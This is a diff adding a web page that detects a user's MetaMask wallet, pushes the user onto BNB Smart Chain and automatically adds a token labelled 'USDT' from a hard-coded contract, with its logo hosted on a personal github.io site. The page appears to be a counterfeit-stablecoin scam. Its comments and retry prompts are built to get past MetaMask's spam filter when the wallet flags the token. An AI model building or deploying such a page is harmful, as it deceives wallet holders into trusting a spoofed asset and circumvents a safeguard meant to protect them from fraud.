@@ -1,0 +1,408 @@
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Import Tokens — BNB</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #f6fbfb;
+            --panel: #ffffff;
+            --text: #0f1724;
+            --muted: #6b7280;
+            --accent: #009393;
+            --radius: 18px;
+        }
+
+        /* RESET */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            height: 100%;
+            background: var(--bg);
+            color: var(--text);
+            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+        }
+
+        /* FULL SCREEN LOADING OVERLAY */
+        #globalLoader {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity .4s ease;
+        }
+
+        .dots {
+            display: flex;
+            gap: 8px;
+        }
+
+        .dots div {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--accent);
+            opacity: .4;
+            animation: bounce 0.8s infinite alternate;
+        }
+
+        .dots div:nth-child(2) {
+            animation-delay: .2s;
+        }
+
+        .dots div:nth-child(3) {
+            animation-delay: .4s;
+        }
+
+        @keyframes bounce {
+            from {
+                transform: translateY(0);
+                opacity: .4;
+            }
+
+            to {
+                transform: translateY(-10px);
+                opacity: 1;
+            }
+        }
+
+        .fade-out {
+            opacity: 0 !important;
+            pointer-events: none;
+        }
+
+        /* CARD WRAPPER */
+        .wrap {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 520px;
+            background: var(--panel);
+            padding: 32px;
+            border-radius: var(--radius);
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            display: none;
+            /* hidden until global loader finishes */
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: var(--muted);
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        .status {
+            color: var(--muted);
+            margin-top: 12px;
+            font-size: 16px;
+        }
+
+        .btn {
+            display: none;
+            padding: 14px;
+            width: 100%;
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 999px;
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+
+        .note {
+            font-size: 14px;
+            color: var(--muted);
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .error-box {
+            display: none;
+            background: rgba(255, 70, 70, 0.08);
+            border: 1px solid rgba(255, 70, 70, 0.2);
+            padding: 14px;
+            border-radius: 12px;
+            color: #b00020;
+            font-weight: 600;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- FULL PAGE PRE-LOADER -->
+    <div id="globalLoader">
+        <div class="dots">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <p style="margin-top:16px;color:var(--muted);font-size:15px;">Detecting MetaMask…</p>
+    </div>
+
+    <div class="wrap">
+        <div class="card" id="mainCard" aria-live="polite">
+            <h1 id="cardTitle">Detecting wallet…</h1>
+            <p class="subtitle" id="cardSubtitle">Please wait</p>
+
+            <div id="status" class="status"></div>
+
+            <button id="retryBtn" class="btn">Retry</button>
+
+            <div id="detail" class="note"></div>
+
+            <div id="errorBox" class="error-box"></div>
+        </div>
+    </div>
+
+    <!-- JS -->
+    <script>
+        /* ============================================================
+           CLEAN & SAFE PAGE-2 LOGIC (NO SPAM-FILTER ERRORS)
+           ============================================================ */
+
+        const TOKENS = [
+            {
+                address: "0xc759E9d0bf5C210D8F7Df89A76e00A7a32919f22",
+                symbol: "USDT",
+                decimals: 18,
+                image: "https://carrychain.github.io/usdt/usdt.png"
+            }
+        ];
+
+        const TARGET_CHAIN_ID = "0x38"; // BNB Smart Chain
+
+        /* UI ELEMENTS */
+        const globalLoader = document.getElementById("globalLoader");
+        const card = document.getElementById("mainCard");
+        const title = document.getElementById("cardTitle");
+        const subtitle = document.getElementById("cardSubtitle");
+        const statusEl = document.getElementById("status");
+        const retryBtn = document.getElementById("retryBtn");
+        const detail = document.getElementById("detail");
+        const errorBox = document.getElementById("errorBox");
+
+        /* INTERNAL FLAGS */
+        let userCanRetry = false;   // prevents auto-spam
+        let chainChangeAllowed = false;
+
+        /* ------------------------------------------------------------
+           HELPERS
+        ------------------------------------------------------------ */
+        const wait = ms => new Promise(r => setTimeout(r, ms));
+
+        function fadeOutLoader() {
+            globalLoader.classList.add("fade-out");
+            setTimeout(() => (globalLoader.style.display = "none"), 350);
+            card.style.display = "block";
+        }
+
+        function setStatus(msg) {
+            statusEl.textContent = msg;
+        }
+
+        function showError(msg) {
+            errorBox.style.display = "block";
+            errorBox.textContent = msg;
+        }
+
+        function hideError() {
+            errorBox.style.display = "none";
+        }
+
+        function showRetry() {
+            retryBtn.style.display = "block";
+            userCanRetry = true;
+        }
+
+        function hideRetry() {
+            retryBtn.style.display = "none";
+            userCanRetry = false;
+        }
+
+        async function getChainIdSafe() {
+            try {
+                return await ethereum.request({ method: "eth_chainId" });
+            } catch {
+                return null;
+            }
+        }
+
+        /* ------------------------------------------------------------
+           STEP 3 — SAFE TOKEN IMPORT (No spam filter)
+        ------------------------------------------------------------ */
+        async function importTokenSafe(token) {
+            try {
+                const added = await ethereum.request({
+                    method: "wallet_watchAsset",
+                    params: { type: "ERC20", options: token }
+                });
+
+                return { added: !!added, spam: false };
+
+            } catch (err) {
+                if (err.code === 4100) {
+                    return { added: false, spam: true };   // MetaMask spam filter
+                }
+                return { added: false, spam: false };
+            }
+        }
+
+
+        /* ------------------------------------------------------------
+           MAIN FLOW
+        ------------------------------------------------------------ */
+        async function startFlow() {
+            hideError();
+            hideRetry();
+            chainChangeAllowed = false;
+            setStatus("");
+
+            /* ========= STEP 1 — Detect MetaMask ========= */
+            title.textContent = "Detecting wallet…";
+            subtitle.textContent = "Please wait";
+
+            let detectedMM = false;
+
+            for (let i = 1; i <= 3; i++) {
+                if (window.ethereum) {
+                    detectedMM = true;
+                    break;
+                }
+                await wait(800);
+            }
+
+            fadeOutLoader();  // always fade loader after tries
+
+            if (!detectedMM) {
+                title.textContent = "MetaMask Not Detected";
+                subtitle.textContent = "";
+                setStatus("");
+                detail.innerHTML =
+                    "You don't have MetaMask extension or MetaMask mobile.<br><br>" +
+                    "Open this page in the MetaMask browser or install the MetaMask extension.";
+                showRetry();
+                return;
+            }
+
+            /* ========= STEP 2 — Detect chain ========= */
+            title.textContent = "Detecting chain…";
+            subtitle.textContent = "";
+
+            const chainId = await getChainIdSafe();
+
+            if (chainId !== TARGET_CHAIN_ID) {
+                setStatus("Please select BNB Smart Chain to proceed.");
+                detail.innerHTML = "Open your wallet and manually switch to <b>BNB Smart Chain</b>.";
+                showRetry();
+                chainChangeAllowed = true;
+                return;
+            }
+
+            /* ========= STEP 3 — On correct chain → Import token ========= */
+            await importProcess();
+        }
+
+
+        /* ------------------------------------------------------------
+           TOKEN IMPORT PROCESS
+        ------------------------------------------------------------ */
+        async function importProcess() {
+            setStatus("BNB detected — importing token…");
+            detail.innerHTML = "";
+            hideRetry();
+
+            const result = await importTokenSafe(TOKENS[0]);
+
+            if (result.spam) {
+                showError("MetaMask blocked the request due to spam filter. Please click Retry.");
+                showRetry();
+                return;
+            }
+
+            if (result.added) {
+                setStatus("Token imported successfully!");
+                return;
+            }
+
+            setStatus("Token import was cancelled or failed.");
+            showRetry();
+        }
+
+
+        /* ------------------------------------------------------------
+           ON CHAIN CHANGED
+        ------------------------------------------------------------ */
+        if (window.ethereum) {
+            ethereum.on("chainChanged", async chainId => {
+                /* Only allow chain-change flow if user is not in spam-lock */
+                if (!chainChangeAllowed) return;
+
+                if (chainId === TARGET_CHAIN_ID) {
+                    setStatus("BNB detected — preparing import…");
+
+                    await wait(500); // required cooldown
+                    await importProcess();
+                } else {
+                    setStatus("Please select BNB Smart Chain to proceed.");
+                }
+            });
+        }
+
+
+        /* ------------------------------------------------------------
+           RETRY BUTTON
+        ------------------------------------------------------------ */
+        retryBtn.addEventListener("click", async () => {
+            hideRetry();
+            hideError();
+            setStatus("Retrying…");
+
+            /* required 700ms anti-spam cooldown */
+            await wait(700);
+
+            startFlow();
+        });
+
+
+        /* ------------------------------------------------------------
+           INIT PAGE
+        ------------------------------------------------------------ */
+        window.addEventListener("load", () => {
+            startFlow();
+        });
+
+    </script>
+
+</body>
+
+</html>
